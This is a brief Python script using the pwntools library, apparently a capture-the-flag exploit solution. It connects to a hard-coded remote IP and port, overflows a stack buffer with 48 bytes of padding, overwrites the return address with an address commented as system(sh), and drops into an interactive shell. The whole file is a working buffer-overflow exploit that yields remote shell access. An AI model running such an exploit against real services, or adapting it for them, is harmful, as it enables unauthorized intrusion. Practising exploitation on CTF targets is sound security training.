from pwn import *

server = remote('60.250.197.227', 10000)
context(arch = 'amd64', os = 'linux')

print(server.read())

# 0x00400687 is the address of system(sh)
server.send(b'a'*48 + p64(0x00400687))
server.interactive()
